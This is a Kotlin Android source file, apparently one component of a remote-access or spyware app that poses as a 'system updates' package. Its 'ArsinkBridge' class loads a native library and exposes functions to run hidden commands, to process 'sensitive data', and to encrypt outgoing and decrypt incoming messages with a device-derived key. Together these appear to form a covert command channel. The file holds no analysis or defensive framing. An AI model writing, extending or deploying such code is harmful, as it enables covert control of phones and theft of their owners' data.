package com.system.updates.modules.bridges

import android.content.Context
import android.os.Build
import android.util.Base64
import android.util.Log
import com.system.updates.CryptoManager
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class ArsinkBridge(private val context: Context) {
    private val TAG = "ArsinkBridge"
    private val crypto = CryptoManager(context)
    private val random = SecureRandom()

    companion object {
        init {
            try {
                System.loadLibrary("arsink_native")
            } catch (e: UnsatisfiedLinkError) {
                Log.e("ArsinkBridge", "Native library not loaded: ${e.message}")
            }
        }
    }

    private external fun nativeExecute(command: String, version: Int): String
    private external fun nativeProcess(data: ByteArray, version: Int): ByteArray

    fun executeHiddenCommand(command: String): String {
        val version = Build.VERSION.SDK_INT
        return try {
            nativeExecute(command, version)
        } catch (e: Exception) {
            Log.e(TAG, "nativeExecute failed: ${e.message}")
            "ERR_EXEC"
        }
    }

    fun processSensitiveData(data: ByteArray): ByteArray {
        val version = Build.VERSION.SDK_INT
        return try {
            nativeProcess(data, version)
        } catch (e: Exception) {
            Log.e(TAG, "nativeProcess failed: ${e.message}")
            byteArrayOf()
        }
    }

    fun encryptOutgoing(data: String): String {
        val key = crypto.deriveDeviceKey()
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, "AES"), GCMParameterSpec(128, iv))
        val encrypted = cipher.doFinal(data.toByteArray())
        val full = iv + encrypted
        return Base64.encodeToString(full, Base64.NO_WRAP)
    }

    fun decryptIncoming(encrypted: String): String {
        val key = crypto.deriveDeviceKey()
        val full = Base64.decode(encrypted, Base64.NO_WRAP)
        val iv = full.sliceArray(0..11)
        val ct = full.sliceArray(12 until full.size)
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key, "AES"), GCMParameterSpec(128, iv))
        return String(cipher.doFinal(ct))
    }

    fun initBridge() {
        Log.i(TAG, "Bridge initialized. SDK: ${Build.VERSION.SDK_INT}")
    }
}